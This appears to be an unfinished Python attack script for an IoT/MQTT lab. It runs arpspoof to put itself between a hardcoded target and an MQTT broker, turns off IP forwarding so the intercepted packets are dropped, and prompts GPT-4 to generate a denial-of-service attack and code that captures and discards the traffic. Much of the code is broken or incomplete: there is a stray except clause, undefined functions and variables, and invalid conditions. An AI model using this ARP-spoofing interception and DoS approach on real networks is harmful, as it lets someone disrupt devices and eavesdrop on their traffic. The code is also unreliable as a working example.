import os
from urllib import response
import openai, threading
import json
import paho.mqtt.client as mqtt
from langchain.prompts import ChatPromptTemplate
from langchain_openai import ChatOpenAI
from scapy.all import *
import struct
import subprocess
import signal
import time
from netfilterqueue import NetfilterQueue
API_KEY = "Insert here"
openai.api_key = API_KEY
llm_model = "gpt-4"
targetIP = "192.168.8.207"
brokerIP = "192.168.8.210"
message = ""
sniffed_topic = ""
sniffed_message = ""
desired_payload = None
stop_flag = False

rec = False

def on_connect(client, userdata, flags, rc):
    print("connected")
def on_message(client, userdata, msg):
    
    global rec
    global message
    
    print("Received Message: ", str(msg.payload.decode("utf-8")))
    rec = True
    message = str(msg.payload.decode("utf-8"))
    #message += '"""'
    #print (message)
    #print (rec)
    #print (message)
def mqtt_payload_parser(payload):
    try:
        # Skip the fixed header (2 bytes minimum, could be more based on Remaining Length encoding)
        # and variable header starting with the topic length (2 bytes)
        topic_len = struct.unpack(">H", payload[2:4])[0]  # MQTT topic length is 2 bytes big-endian
        topic = payload[4:4+topic_len].decode()  # Extract topic
        message = payload[4+topic_len:].decode()  # Extract message
        return topic, message
    except Exception as e:
        return None, None
                
'''
denial_of_service() - Method responsible for performing the denial of service attack.
'''
def denial_of_service():
    try:
        print("Performing Denial of Serivce Attack....")
        #TODO: Have AI generate this command
        openai.api_key
        prompt = "Generate denial of service attack for " + targetIP
    # Function to send a message to ChatGPT
        def send_message_to_gpt(prompt):
            response = openai.ChatCompletion.create(model=llm_model,messages=[{"role": "user", "content": prompt}])

    finally:
        return response['choices'][0]['message']['content']

    
os.system("sudo sysctl -w net.ipv4.ip_forward=0")
        #Reroutes packets from the MQTT server through this computer.
nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, brokerIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
while True:
    #TODO: Have AI generate this command.
    
    prompt = "generate a code that stores all data from these pactets then drops them "
    response = openai.ChatCompletion.create(model=llm_model,messages=[{"role": "user", "content": prompt}])
            #Reroutes packets from the MQTT server through this computer.
    nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, brokerIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    while True:
            time.sleep(5)
    #Kills the program when desired.
    except KeyboardInterrupt:
    print("Stopping DDOS process...")
    os.kill(nodeAttack.pid, signal.SIGTERM)

#TODO: Create a command that sends relevant attack information to the XR AI agent (Trenton).

try:
    while True: 
        lang_classification()
        #Classifies the responcs in an array
        response = lang_classification()
        
        # looks through the array to find the type of attack opens API key and returns message generated
        if x in response is true:
            attack_type = x
            API_KEY
            response = openai.ChatCompletion.create(model=llm_model, messages=[{"role": "user", "content": "Generate information about " + attack_type + " attacks"}])['choices'][0]['message']['content']
finally:
#publish to a broker topic the the VR to pull and print message from
    client.on_connect = on_connect

# Connect to the broker
    client.connect(brokerIP, broker_port, 60)

# Start the loop to process network traffic and dispatch callbacks
    client.loop_start()

# Publish data to the broker

    client.publish(attack_info, response)

# Stop the loop after publishing
    client.loop_stop()

# Disconnect from the broker
    client.disconnect()
    fake_data_transfer_attack()
#denial_of_service()


except KeyboardInterrupt:
    print("Stopping Attack....")

except KeyboardInterrupt:
    print("Stopping Attack....")

